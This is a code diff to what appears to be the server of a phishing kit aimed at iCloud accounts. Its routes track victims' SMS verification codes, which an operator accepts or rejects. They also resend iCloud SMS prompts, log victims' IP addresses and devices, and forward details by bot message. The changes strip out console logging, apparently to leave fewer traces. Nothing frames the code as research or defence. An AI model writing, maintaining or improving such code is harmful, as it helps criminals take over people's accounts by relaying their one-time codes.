@@ -564,13 +564,6 @@ app.post("/update-status", (req, res) => {
     // ✅ NEW: Handle SMS status updates
     if (pendingSMS[identifier]) {
       pendingSMS[identifier].status = status;
-      if (status === "sms_accept") {
-        const smsCode = pendingSMS[identifier].smsCode;
-        console.log(`💬 <code>${smsCode}</code> SMS <b>Accepted</b>!✅`);
-      } else if (status === "sms_reject") {
-        const smsCode = pendingSMS[identifier].smsCode;
-        console.log(`💬 <code>${smsCode}</code> SMS <b>Rejected</b>!❌`);
-      }
       return res.json({ ok: true });
     }
 
@@ -1106,8 +1099,6 @@ app.post("/resend-icloud-sms", async (req, res) => {
       return res.status(400).json({ error: "Missing email" });
     }
 
-    console.log(`📲 Resending iCloud SMS to ${email} (requestId: ${requestId})`);
-
     const ip = getIP(req);
     const userAgent = req.get("user-agent") || "Unknown";
     const device = detectDevice(userAgent);
@@ -1125,7 +1116,6 @@ app.post("/resend-icloud-sms", async (req, res) => {
       await sendFollowUpMessage(email, message, {
         parse_mode: "HTML"
       });
-      console.log(`✅ Resend iCloud SMS sent successfully`);
     } else {
       console.log(`⚠️ No winner found for ${email}`);
       return res.status(400).json({ error: "No winner determined" });
@@ -1445,7 +1435,6 @@ app.post("/update-selected-digits", (req, res) => {
     }
 
     pendingVerificationPage[requestId].selectedDigits.push(digit);
-    console.log(`✅ Digit ${digit} selected for ${requestId}`);
 
     res.json({ ok: true, selectedCount: pendingVerificationPage[requestId].selectedDigits.length });
   } catch (err) {
